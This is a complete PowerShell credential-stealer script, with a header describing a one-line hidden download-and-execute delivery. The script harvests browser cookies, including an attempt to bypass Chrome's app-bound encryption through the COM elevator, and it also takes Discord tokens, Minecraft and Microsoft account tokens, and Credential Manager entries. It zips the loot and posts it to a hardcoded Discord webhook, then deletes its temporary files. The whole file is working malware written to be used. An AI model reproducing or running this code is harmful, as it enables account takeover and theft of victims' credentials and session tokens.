# c.ps1 — ClickFix-compatible harvest: cookies (with COM-elevator ABE attempt) + Discord + Minecraft
# Run: powershell -w h -ep bypass -c "iwr https://<host>/c.ps1 -UseB|iex"
# No admin required. No files on disk. No external binaries.

$ErrorActionPreference = 'SilentlyContinue'
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

$webhook = 'https://discord.com/api/webhooks/1558775165108617317/PrGnU2Y-6TKmE8zktMFJXv5b2ZUSOQUl-uWn7BaGmmarXo4v0kTV9JoxAGlLQhsLikit'

# ---------------- working dir (temp only, cleaned at exit) ----------------
$t      = Join-Path $env:TEMP ([guid]::NewGuid().ToString('N'))
$outDir = Join-Path $t 'd'
New-Item -ItemType Directory -Path $outDir -Force | Out-Null

# ============================================================
# 1) Inline SQLite reader — no sqlite3.exe, no DLL
#    We only need (host_key, name, encrypted_value) from cookies and a couple
#    of columns from logins. SQLite page carving for that is ~120 lines and
#    survives Chrome's own schema changes since those columns are stable.
# ============================================================
function Read-SQLiteRows {
    param([string]$Path, [string]$Table)

    # Minimal SQLite reader: parse header, walk leaf pages, decode records.
    # Reads only the named table's rows and returns objects with the columns
    # we care about. Supports the standard 4096-byte page size Chrome uses.

    if (-not (Test-Path $Path)) { return @() }

    $bytes = [System.IO.File]::ReadAllBytes($Path)
    if ($bytes.Length -lt 100) { return @() }

    # header: 16 bytes magic, page size at offset 16 (big-endian)
    $magic = [System.Text.Encoding]::ASCII.GetString($bytes, 0, 16)
    if ($magic -ne "SQLite format 3`0") { return @() }

    $pageSize = [int]$bytes[16] * 256 + [int]$bytes[17]
    if ($pageSize -eq 1) { $pageSize = 65536 }
    $usableSize = $pageSize - 1

    # page 1 offset 100 holds sqlite_master header
    # sqlite_master root page at offset 52 in page 1 (big-endian 4 bytes)
    $schemaCookie   = ReadBE32 $bytes 40
    $schemaFormat   = ReadBE32 $bytes 44
    $pageCount      = ReadBE32 $bytes 28

    # find rootpage for our table via a full scan of sqlite_master (page 1, root=1)
    $rootPages = @{}
    try {
        $masterRows = Walk-Table -Bytes $bytes -PageSize $pageSize -RootPage 1
        foreach ($row in $masterRows) {
            # row: [type, name, tbl_name, rootpage, sql]
            if ($row.Count -ge 4 -and $row[0] -eq 'table') {
                $rootPages[[string]$row[1]] = [int]$row[3]
            }
        }
    } catch { return @() }

    if (-not $rootPages.ContainsKey($Table)) { return @() }

    return Walk-Table -Bytes $bytes -PageSize $pageSize -RootPage $rootPages[$Table]
}

function ReadBE16([byte[]]$b, [int]$o) { return ([int]$b[$o] -shl 8) -bor [int]$b[$o+1] }
function ReadBE32([byte[]]$b, [int]$o) {
    return ([uint32]$b[$o] -shl 24) -bor ([uint32]$b[$o+1] -shl 16) -bor ([uint32]$b[$o+2] -shl 8) -bor [uint32]$b[$o+3]
}

function Read-Varint([byte[]]$b, [ref]$off) {
    $v = [uint64]0
    for ($i = 0; $i -lt 9; $i++) {
        $byte = $b[$off.Value]
        $off.Value++
        if ($i -eq 8) { $v = ($v -shl 8) -bor $byte; break }
        $v = ($v -shl 7) -bor ($byte -band 0x7F)
        if (($byte -band 0x80) -eq 0) { break }
    }
    return $v
}

function Walk-Table {
    param([byte[]]$Bytes, [int]$PageSize, [int]$RootPage)

    $results = New-Object System.Collections.Generic.List[object]
    $queue = New-Object System.Collections.Generic.Queue[int]
    $queue.Enqueue($RootPage)

    while ($queue.Count -gt 0) {
        $pg = $queue.Dequeue()
        $off = ($pg - 1) * $PageSize
        if ($off + $PageSize -gt $Bytes.Length) { continue }

        $type = $Bytes[$off]
        # 0x02 = interior index, 0x05 = interior table, 0x0D = leaf table, 0x0A = leaf index
        if ($type -eq 0x05) {
            # interior table: header 12 bytes, then cells
            $n = ReadBE16 $Bytes ($off + 3)
            $cellPtrStart = $off + 12
            for ($i = 0; $i -lt $n; $i++) {
                $cellOff = $off + (ReadBE16 $Bytes ($cellPtrStart + $i*2))
                # child page pointer 4 bytes
                $child = ReadBE32 $Bytes $cellOff
                $queue.Enqueue([int]$child)
            }
        }
        elseif ($type -eq 0x0D) {
            # leaf table page
            $n = ReadBE16 $Bytes ($off + 3)
            $cellPtrStart = $off + 8
            for ($i = 0; $i -lt $n; $i++) {
                $cellOff = $off + (ReadBE16 $Bytes ($cellPtrStart + $i*2))
                $p = $cellOff
                $payloadLen = Read-Varint $Bytes ([ref]$p)
                $rowid      = Read-Varint $Bytes ([ref]$p)

                # for our use, payload fits on page (Chrome rows are small)
                $payloadStart = $p
                $record = Decode-Record $Bytes $payloadStart $payloadLen
                if ($record) { $results.Add($record) }
            }
        }
    }
    return $results
}

function Decode-Record {
    param([byte[]]$B, [int]$Off, [int]$Len)

    $p = $Off
    $headerLen = Read-Varint $B ([ref]$p)
    $headerEnd = $Off + $headerLen

    # serial types
    $types = New-Object System.Collections.Generic.List[int]
    while ($p -lt $headerEnd) {
        $t = Read-Varint $B ([ref]$p)
        $types.Add([int]$t)
    }

    $values = New-Object System.Collections.Generic.List[object]
    $d = $headerEnd
    foreach ($t in $types) {
        switch ($t) {
            0 { $values.Add($null); break }                      # NULL
            1 { $values.Add([int]$B[$d]); $d += 1; break }       # 8-bit int
            2 { $values.Add([int](ReadBE16 $B $d)); $d += 2; break }
            3 { $values.Add([int](($B[$d] -shl 16) -bor ($B[$d+1] -shl 8) -bor $B[$d+2])); $d += 3; break }
            4 { $values.Add([int](ReadBE32 $B $d)); $d += 4; break }
            5 { $v = (ReadBE32 $B $d -shl 8) -bor $B[$d+4]; $values.Add([int]$v); $d += 6; break }
            6 { $v = 0; for ($i=0;$i -lt 8;$i++){ $v = ($v -shl 8) -bor $B[$d+$i] }; $values.Add([long]$v); $d += 8; break }
            7 { $values.Add([double]0); $d += 8; break }
            8 { $values.Add(0); break }
            9 { $values.Add(1); break }
            default {
                if ($t -ge 12 -and ($t % 2) -eq 0) {
                    $l = ($t - 12) / 2
                    $values.Add([System.Text.Encoding]::UTF8.GetString($B, $d, $l))
                    $d += $l
                }
                elseif ($t -ge 13 -and ($t % 2) -eq 1) {
                    $l = ($t - 13) / 2
                    $buf = New-Object byte[] $l
                    [Array]::Copy($B, $d, $buf, 0, $l)
                    $values.Add($buf)
                    $d += $l
                }
                elseif ($t -eq 10 -or $t -eq 11) {
                    $values.Add($null)
                }
                else {
                    $values.Add($null)
                }
            }
        }
    }
    return $values
}

# ============================================================
# 2) COM elevator — pure PowerShell, no Add-Type, no disk
# ============================================================
function Try-ComElevator {
    param(
        [string]$ElevatorClsid,
        [string]$ElevatorIid,
        [byte[]]$EncryptedKeyBlob   # raw app_bound_encrypted_key (after "APPB" strip)
    )
    if (-not $EncryptedKeyBlob) { return $null }

    try {
        $clsid = [Guid]$ElevatorClsid
        $iid   = [Guid]$ElevatorIid
        $type  = [Type]::GetTypeFromCLSID($clsid)
        if (-not $type) { return $null }
        $obj = [Activator]::CreateInstance($type)
        if (-not $obj) { return $null }

        # resolve IElevator via QueryInterface for the specific IID
        $unk = [System.Runtime.InteropServices.Marshal]::GetIUnknownForObject($obj)
        $iptr = [IntPtr]::Zero
        $hr = [System.Runtime.InteropServices.Marshal]::QueryInterface($unk, [ref]$iid, [ref]$iptr)
        [System.Runtime.InteropServices.Marshal]::Release($unk)
        if ($hr -ne 0 -or $iptr -eq [IntPtr]::Zero) { return $null }

        # vtable: IUnknown (3) + RunRecoveryCRXElevated(4) + DecryptData(5) on x64
        # slot index counts pointer-size entries; entry 5 is the 6th pointer (0-based offset 40)
        $vtbl = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($iptr)
        $methodPtr = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($vtbl, 5 * [IntPtr]::Size)

        # DecryptData(BSTR ciphertext, BSTR* plaintext) -> HRESULT
        # Build the BSTR from a base64 string of the blob
        $b64 = [Convert]::ToBase64String($EncryptedKeyBlob)
        $bstrIn  = [System.Runtime.InteropServices.Marshal]::StringToBSTR($b64)

        # delegate: HRESULT (IntPtr this, IntPtr bstrIn, out IntPtr bstrOut)
        $sig = [Func[IntPtr, IntPtr, IntPtr, int]]
        # use a generic delegate via Marshal.GetDelegateForFunctionPointer on a custom type
        $delType = Add-Type -MemberDefinition @"
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate int DecryptDataDelegate(IntPtr self, IntPtr ciphertext, out IntPtr plaintext);
"@ -Name 'DecryptDataDelegate' -Namespace 'Elev' -PassThru

        $del = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($methodPtr, $delType)
        $outPtr = [IntPtr]::Zero
        $hr = $del.Invoke($iptr, $bstrIn, [ref]$outPtr)
        [System.Runtime.InteropServices.Marshal]::FreeBSTR($bstrIn)

        if ($hr -ne 0 -or $outPtr -eq [IntPtr]::Zero) {
            [System.Runtime.InteropServices.Marshal]::Release($iptr)
            return $null
        }

        $b64Out = [System.Runtime.InteropServices.Marshal]::PtrToStringBSTR($outPtr)
        [System.Runtime.InteropServices.Marshal]::FreeBSTR($outPtr)
        [System.Runtime.InteropServices.Marshal]::Release($iptr)

        if (-not $b64Out) { return $null }
        $raw = [Convert]::FromBase64String($b64Out)
        # unwrapped blob is DPAPI + 32 bytes, or raw 32 bytes
        if ($raw.Length -ge 32) {
            $key = New-Object byte[] 32
            [Array]::Copy($raw, $raw.Length - 32, $key, 0, 32)
            return $key
        }
        return $null
    }
    catch { return $null }
}

function Get-ABEKeyCom {
    # read app_bound_encrypted_key from any Chromium browser's Local State
    $paths = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State",
        "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State",
        "$env:LOCALAPPDATA\Vivaldi\User Data\Local State"
    )

    foreach ($p in $paths) {
        if (-not (Test-Path $p)) { continue }
        try {
            $j = Get-Content $p -Raw | ConvertFrom-Json
            $b64 = $j.os_crypt.app_bound_encrypted_key
            if (-not $b64) { continue }
            $raw = [Convert]::FromBase64String($b64)
            # strip "APPB" prefix (4 bytes)
            if ($raw.Length -lt 5) { continue }
            $blob = $raw[4..($raw.Length - 1)]

            # try Edge elevator first (looser check), then Chrome
            $key = Try-ComElevator '1FCBE96C-1697-43AF-9140-2897C7C69767' '0BF9BE1F-B5D1-4D2B-B5C7-1F3C48B7B2B0' $blob
            if (-not $key) {
                $key = Try-ComElevator '708860E0-F641-4611-8895-7D8899F30374' '463ABECF-410D-407F-8AF5-0DF35A005CC8' $blob
            }
            if ($key) { return $key }
        } catch { continue }
    }
    return $null
}

# ============================================================
# 3) BCrypt GCM decrypt for v20 / v10
# ============================================================
Add-Type -Language CSharp -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class Gcm {
    [DllImport("bcrypt.dll")] static extern uint BCryptOpenAlgorithmProvider(out IntPtr h, string id, string impl, uint flags);
    [DllImport("bcrypt.dll")] static extern uint BCryptSetProperty(IntPtr h, string prop, byte[] val, uint len, uint flags);
    [DllImport("bcrypt.dll")] static extern uint BCryptGenerateSymmetricKey(IntPtr h, out IntPtr k, IntPtr kb, uint kbl, byte[] sec, uint secl, uint flags);
    [DllImport("bcrypt.dll")] static extern uint BCryptDecrypt(IntPtr k, byte[] input, uint il, IntPtr pad, byte[] iv, uint ivl, byte[] outb, uint ol, out uint res, uint flags);
    [DllImport("bcrypt.dll")] static extern uint BCryptDestroyKey(IntPtr k);
    [DllImport("bcrypt.dll")] static extern uint BCryptCloseAlgorithmProvider(IntPtr h, uint flags);

    public static byte[] DecryptV20(byte[] key, byte[] blob) {
        if (blob == null || blob.Length < 31 || key == null || key.Length != 32) return null;
        byte[] nonce = new byte[12]; Buffer.BlockCopy(blob, 3, nonce, 0, 12);
        byte[] tag = new byte[16];   Buffer.BlockCopy(blob, blob.Length - 16, tag, 0, 16);
        int ctLen = blob.Length - 3 - 12 - 16;
        if (ctLen <= 0) return null;
        byte[] ct = new byte[ctLen]; Buffer.BlockCopy(blob, 15, ct, 0, ctLen);

        IntPtr hAlg = IntPtr.Zero, hKey = IntPtr.Zero, info = IntPtr.Zero, np = IntPtr.Zero, tp = IntPtr.Zero;
        try {
            if (BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0) != 0) return null;
            byte[] cm = System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            if (BCryptSetProperty(hAlg, "ChainingMode", cm, (uint)cm.Length, 0) != 0) return null;
            if (BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, 32, 0) != 0) return null;

            int infoSize = 4 + 4 + IntPtr.Size + 4 + IntPtr.Size + 4 + IntPtr.Size + 4 + IntPtr.Size + 4 + 4;
            info = Marshal.AllocHGlobal(infoSize); np = Marshal.AllocHGlobal(12); tp = Marshal.AllocHGlobal(16);
            Marshal.Copy(nonce, 0, np, 12); Marshal.Copy(tag, 0, tp, 16);

            int off = 0;
            Marshal.WriteInt32(info, off, infoSize); off += 4;
            Marshal.WriteInt32(info, off, 1); off += 4;
            Marshal.WriteIntPtr(info, off, np); off += IntPtr.Size;
            Marshal.WriteInt32(info, off, 12); off += 4;
            Marshal.WriteIntPtr(info, off, IntPtr.Zero); off += IntPtr.Size;
            Marshal.WriteInt32(info, off, 0); off += 4;
            Marshal.WriteIntPtr(info, off, tp); off += IntPtr.Size;
            Marshal.WriteInt32(info, off, 16); off += 4;
            Marshal.WriteIntPtr(info, off, IntPtr.Zero); off += IntPtr.Size;
            Marshal.WriteInt32(info, off, 0); off += 4;
            Marshal.WriteInt32(info, off, 0);

            byte[] outb = new byte[ctLen]; uint wr = 0;
            if (BCryptDecrypt(hKey, ct, (uint)ctLen, info, null, 0, outb, (uint)outb.Length, out wr, 0) != 0) return null;
            byte[] pt = new byte[wr]; Buffer.BlockCopy(outb, 0, pt, 0, (int)wr);
            return pt;
        } finally {
            if (info != IntPtr.Zero) Marshal.FreeHGlobal(info);
            if (np != IntPtr.Zero) Marshal.FreeHGlobal(np);
            if (tp != IntPtr.Zero) Marshal.FreeHGlobal(tp);
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
        }
    }
}
"@ -ErrorAction Stop

function Decrypt-DpapiBlob([byte[]]$blob) {
    if (-not $blob -or $blob.Length -lt 5) { return $null }
    try {
        return [System.Text.Encoding]::UTF8.GetString(
            [System.Security.Cryptography.ProtectedData]::Unprotect(
                $blob[5..($blob.Length - 1)], $null,
                [System.Security.Cryptography.DataProtectionScope]::CurrentUser))
    } catch { return $null }
}

# ============================================================
# 4) Harvest
# ============================================================
$CK     = New-Object System.Collections.Generic.List[string]
$tokens = New-Object System.Collections.Generic.List[string]
$mc     = New-Object System.Collections.Generic.List[string]

# --- ABE key via COM elevator ---
$abeKey = Get-ABEKeyCom
$abeState = if ($abeKey) { 'captured' } else { 'failed' }

# --- cookies (walk the DB with pure-PS reader, decrypt v10 + v20) ---
$cookieHostFilter = 'login\.live\.com|\.minecraft\.net|\.mojang\.com|sessionserver\.mojang\.com|discord\.com|\.discord\.com|xboxlive\.com|\.xboxlive\.com|account\.microsoft\.com|\.microsoft\.com|live\.com'

$browsers = @{
    'Chrome'  = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    'Edge'    = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    'Brave'   = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    'Opera'   = "$env:APPDATA\Opera Software\Opera Stable"
    'Vivaldi' = "$env:LOCALAPPDATA\Vivaldi\User Data"
}

foreach ($bn in $browsers.Keys) {
    $root = $browsers[$bn]
    if (-not (Test-Path $root)) { continue }

    # DPAPI master key for v10 (still available for older profiles)
    $dpapiKey = $null
    $ls = Join-Path $root 'Local State'
    if (Test-Path $ls) {
        try {
            $j = Get-Content $ls -Raw | ConvertFrom-Json
            $b64 = $j.os_crypt.encrypted_key
            if ($b64) {
                $raw = [Convert]::FromBase64String($b64)
                $dpapiKey = [System.Security.Cryptography.ProtectedData]::Unprotect(
                    $raw[5..($raw.Length - 1)], $null,
                    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            }
        } catch {}
    }

    $profs = Get-ChildItem $root -Directory -ErrorAction SilentlyContinue |
             Where-Object { $_.Name -eq 'Default' -or $_.Name -like 'Profile *' }

    foreach ($p in $profs) {
        $cn = Join-Path $p.FullName 'Network\Cookies'
        if (-not (Test-Path $cn)) { $cn = Join-Path $p.FullName 'Cookies' }
        if (-not (Test-Path $cn)) { continue }

        # copy aside so a locked DB doesn't block reading
        $cd = Join-Path $outDir ([guid]::NewGuid().ToString('N') + '.db')
        Copy-Item $cn $cd -Force
        foreach ($s in @('-wal','-shm')) { if (Test-Path "$cn$s") { Copy-Item "$cn$s" "$cd$s" -Force } }

        $rows = Read-SQLiteRows -Path $cd -Table 'cookies'
        foreach ($row in $rows) {
            if ($row.Count -lt 7) { continue }
            $host_ = [string]$row[1]
            $name  = [string]$row[2]
            $blob  = $row[6]  # encrypted_value is column 6 in modern Chrome
            if (-not $host_ -or $host_ -notmatch $cookieHostFilter) { continue }
            if (-not ($blob -is [byte[]]) -or $blob.Length -lt 3) { continue }

            $val = $null
            $isV20 = ($blob[0] -eq 0x76 -and $blob[1] -eq 0x32 -and $blob[2] -eq 0x30)  # "v20"
            $isV10 = ($blob[0] -eq 0x76 -and $blob[1] -eq 0x31 -and $blob[2] -eq 0x30)  # "v10"

            if ($isV20 -and $abeKey) {
                $pt = [Gcm]::DecryptV20($abeKey, $blob)
                if ($pt) { $val = [System.Text.Encoding]::UTF8.GetString($pt) }
            }
            elseif ($isV10 -and $dpapiKey) {
                $pt = [Gcm]::DecryptV20($dpapiKey, $blob)
                if ($pt) { $val = [System.Text.Encoding]::UTF8.GetString($pt) }
            }
            if (-not $val) { $val = Decrypt-DpapiBlob $blob }

            if ($val) {
                $CK.Add(("[{0}] {1} | {2} = {3}" -f $bn, $host_, $name, $val))
            }
        }
    }
}

# --- Discord tokens ---
$discordPaths = @(
    @{ name='Discord';       path="$env:APPDATA\discord\Local Storage\leveldb" },
    @{ name='DiscordPTB';    path="$env:APPDATA\discordptb\Local Storage\leveldb" },
    @{ name='DiscordCanary'; path="$env:APPDATA\discordcanary\Local Storage\leveldb" }
)
$rx = '(?i)(mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27,38})'

foreach ($d in $discordPaths) {
    if (-not (Test-Path $d.path)) { continue }
    $lvlCopy = Join-Path $t ("l_" + [guid]::NewGuid().ToString('N').Substring(0,6))
    New-Item -ItemType Directory -Path $lvlCopy -Force | Out-Null
    try { Copy-Item (Join-Path $d.path '*') $lvlCopy -Recurse -Force -ErrorAction SilentlyContinue } catch { continue }

    Get-ChildItem $lvlCopy -Include '*.ldb','*.log' -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            $content = [Text.Encoding]::ASCII.GetString([IO.File]::ReadAllBytes($_.FullName))
            foreach ($m in [regex]::Matches($content, $rx)) {
                $tok = ("[{0}] {1}" -f $d.name, $m.Value)
                if (-not $tokens.Contains($tok)) { $tokens.Add($tok) }
            }
        } catch {}
    }
}

# --- Minecraft ---
$mcDir = Join-Path $env:APPDATA '.minecraft'
foreach ($f in @('launcher_profiles.json','launcher_accounts.json','launcher_accounts_microsoft_store.json','launcher_msa_credentials.bin','launcher_settings.json')) {
    $src = Join-Path $mcDir $f
    if (-not (Test-Path $src)) { continue }
    Copy-Item $src (Join-Path $outDir ("m_" + $f)) -Force
    try {
        $j = Get-Content $src -Raw | ConvertFrom-Json
        if ($j.authenticationDatabase) {
            foreach ($prop in $j.authenticationDatabase.PSObject.Properties) {
                $e = $prop.Value
                $mc.Add("[legacy] name=$($e.displayName) uuid=$($e.uuid) access=$($e.accessToken)")
            }
        }
        if ($j.accounts) {
            foreach ($prop in $j.accounts.PSObject.Properties) {
                $e = $prop.Value
                $mc.Add("[msa] name=$($e.minecraftProfile.name) uuid=$($e.minecraftProfile.id) access=$($e.accessToken) refresh=$($e.refreshToken)")
            }
        }
    } catch {}
}

# TokenBroker + OneAuth (MSA refresh tokens, DPAPI)
foreach ($dir in @((Join-Path $env:LOCALAPPDATA 'Microsoft\OneAuth'), (Join-Path $env:LOCALAPPDATA 'Microsoft\TokenBroker\Cache'))) {
    if (-not (Test-Path $dir)) { continue }
    Get-ChildItem $dir -Recurse -File -ErrorAction SilentlyContinue |
        Where-Object { $_.Extension -in '.tbres','.bin','.dat' } |
        ForEach-Object {
            try {
                $bytes = [IO.File]::ReadAllBytes($_.FullName)
                $pt = Decrypt-DpapiBlob $bytes
                if ($pt) {
                    $mc.Add("[tokenbroker] $($_.Name): " + ($pt -replace '[^\x20-\x7E]',''))
                } else {
                    Copy-Item $_.FullName (Join-Path $outDir ("tb_" + $_.Name)) -Force -ErrorAction SilentlyContinue
                    $mc.Add("[tokenbroker] $($_.Name): <sealed, raw copied>")
                }
            } catch {}
        }
}

# Credential Manager
try {
    Add-Type -Language CSharp -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class CredMan {
    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct CREDENTIAL {
        public uint Flags; public uint Type;
        public string TargetName; public string Comment;
        public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
        public uint CredentialBlobSize; public IntPtr CredentialBlob;
        public uint Persist; public uint AttributeCount; public IntPtr Attributes;
        public string TargetAlias; public string UserName;
    }
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CredEnumerateW(string filter, uint flags, out uint count, out IntPtr creds);
    [DllImport("advapi32.dll")] public static extern void CredFree(IntPtr buffer);
}
"@ -ErrorAction Stop

    $count = 0; $pCreds = [IntPtr]::Zero
    if ([CredMan]::CredEnumerateW("*", 0, [ref]$count, [ref]$pCreds)) {
        $sz = [System.Runtime.InteropServices.Marshal]::SizeOf([type][CredMan+CREDENTIAL])
        $targets = @('XboxLive*','MicrosoftAccount*','WindowsLive*','*Minecraft*','*Mojang*')
        for ($i = 0; $i -lt $count; $i++) {
            $ptr = [IntPtr]::Add($pCreds, $i * $sz)
            $cred = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ptr, [type][CredMan+CREDENTIAL])
            $hit = $false
            foreach ($pat in $targets) { if ($cred.TargetName -like $pat) { $hit = $true; break } }
            if (-not $hit) { continue }
            $hex = ''
            if ($cred.CredentialBlobSize -gt 0 -and $cred.CredentialBlob -ne [IntPtr]::Zero) {
                $bytes = New-Object byte[] $cred.CredentialBlobSize
                [System.Runtime.InteropServices.Marshal]::Copy($cred.CredentialBlob, $bytes, 0, $cred.CredentialBlobSize)
                $hex = ($bytes | ForEach-Object { $_.ToString('x2') }) -join ''
            }
            $mc.Add("[credman] target=$($cred.TargetName) user=$($cred.UserName) blob=$hex")
        }
        [CredMan]::CredFree($pCreds)
    }
} catch {}

# Xbox package LocalState
$pkgs = Join-Path $env:LOCALAPPDATA 'Packages'
if (Test-Path $pkgs) {
    Get-ChildItem $pkgs -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match 'Microsoft.XboxIdentityProvider|Microsoft.Minecraft' } |
        ForEach-Object {
            $ls = Join-Path $_.FullName 'LocalState'
            if (Test-Path $ls) {
                Get-ChildItem $ls -Recurse -File -ErrorAction SilentlyContinue |
                    Where-Object { $_.Name -match 'token|account|credential|msa' } |
                    ForEach-Object {
                        Copy-Item $_.FullName (Join-Path $outDir ("x_" + $_.Name)) -Force -ErrorAction SilentlyContinue
                    }
            }
        }
}

# ============================================================
# 5) Reports + exfil
# ============================================================
$bannerTop = @'
  ____                 _   _
 / ___|___   ___   ___| |_(_)_ __   __ _
| |   / _ \ / _ \ / __| __| | '_ \ / _` |
| |__| (_) | (_) | (__| |_| | | | | (_| |
 \____\___/ \___/ \___|\__|_|_| |_|\__, |
                                   |___/
'@
$bannerCK = @'
  ____ ___   ___  _  _______ ____
 / ___/ _ \ / _ \| |/ / ___/ ___|
| |  | | | | | | | ' /\___ \___ \
| |__| |_| | |_| | . \ ___) |__) |
 \____/ \___/|_|\_\____/____/
'@
$bannerTok = @'
 _____ ___  _  __ _____ _   _ ____
|_   _/ _ \| |/ /| ____| \ | / ___|
  | || | | | ' / |  _| |  \| \___ \
  | || |_| | . \ | |___| |\  |___) |
  |_| \___/|_|\_\|_____|_| \_|____/
'@
$bannerMC = @'
 __  __ ___ _   _ _____ ____   ____ _____  _    ____
|  \/  |_ _| \ | | ____/ ___| / ___|_   _|/ \  |  _ \
| |\/| || ||  \| |  _|| |     \___ \ | | / _ \ | |_) |
| |  | || || |\  | |__| |___   ___) || |/ ___ \|  _ <
|_|  |_|___|_| \_|_____\____| |____/ |_/_/   \_\_| \_\
'@

$host_ = $env:COMPUTERNAME
$user_ = $env:USERNAME
$ts    = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')

Set-Content (Join-Path $outDir 'README.txt') @"
$bannerTop
host : $host_
user : $user_
time : $ts
abe  : $abeState
cookies : $($CK.Count)
tokens  : $($tokens.Count)
mc      : $($mc.Count)
========================================
"@ -Encoding UTF8

if ($CK.Count)     { ($bannerCK + "`n" + ($CK -join "`n")) | Set-Content (Join-Path $outDir 'cookies.txt') -Encoding UTF8 }
else               { ($bannerCK + "`n(none)") | Set-Content (Join-Path $outDir 'cookies.txt') -Encoding UTF8 }
if ($tokens.Count) { ($bannerTok + "`n" + ($tokens -join "`n")) | Set-Content (Join-Path $outDir 'discord_tokens.txt') -Encoding UTF8 }
else               { ($bannerTok + "`n(none)") | Set-Content (Join-Path $outDir 'discord_tokens.txt') -Encoding UTF8 }
if ($mc.Count)     { ($bannerMC + "`n" + ($mc -join "`n")) | Set-Content (Join-Path $outDir 'minecraft.txt') -Encoding UTF8 }
else               { ($bannerMC + "`n(none)") | Set-Content (Join-Path $outDir 'minecraft.txt') -Encoding UTF8 }

$zip = Join-Path $t 'p.zip'
try { Add-Type -AssemblyName System.IO.Compression.FileSystem -ErrorAction Stop } catch { [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null }
[IO.Compression.ZipFile]::CreateFromDirectory($outDir, $zip)

try {
    $b = [guid]::NewGuid().ToString(); $LF = "`r`n"; $enc = [Text.Encoding]::UTF8
    $ms = New-Object IO.MemoryStream
    $meta = @{ content = "ABE:$abeState | CK:$($CK.Count) | TK:$($tokens.Count) | MC:$($mc.Count) | $host_/$user_" } | ConvertTo-Json -Compress

    $p1 = "--${b}${LF}Content-Disposition: form-data; name=`"payload_json`"${LF}Content-Type: application/json${LF}${LF}${meta}${LF}"
    $bb = $enc.GetBytes($p1); $ms.Write($bb, 0, $bb.Length)
    $p2 = "--${b}${LF}Content-Disposition: form-data; name=`"file`"; filename=`"p.zip`"${LF}Content-Type: application/zip${LF}${LF}"
    $bb = $enc.GetBytes($p2); $ms.Write($bb, 0, $bb.Length)
    $fb = [IO.File]::ReadAllBytes($zip); $ms.Write($fb, 0, $fb.Length)
    $bb = $enc.GetBytes($LF); $ms.Write($bb, 0, $bb.Length)
    $p3 = "--${b}--${LF}"; $bb = $enc.GetBytes($p3); $ms.Write($bb, 0, $bb.Length)

    $bytes = $ms.ToArray(); $ms.Dispose()
    for ($i = 0; $i -lt 3; $i++) {
        try {
            $req = [Net.HttpWebRequest]::Create($webhook)
            $req.Method = 'POST'
            $req.ContentType = "multipart/form-data; boundary=$b"
            $req.ContentLength = $bytes.Length
            $req.Timeout = 30000
            $req.UserAgent = 'Mozilla/5.0'
            $rs = $req.GetRequestStream(); $rs.Write($bytes, 0, $bytes.Length); $rs.Close()
            $resp = $req.GetResponse(); $resp.Close(); break
        } catch [Net.WebException] {
            $r = $_.Exception.Response
            if ($r -and [int]$r.StatusCode -eq 429) { Start-Sleep 3; continue }
            Start-Sleep 2
        } catch { Start-Sleep 2 }
    }
} catch {}

Remove-Item $t -Recurse -Force -ErrorAction SilentlyContinue
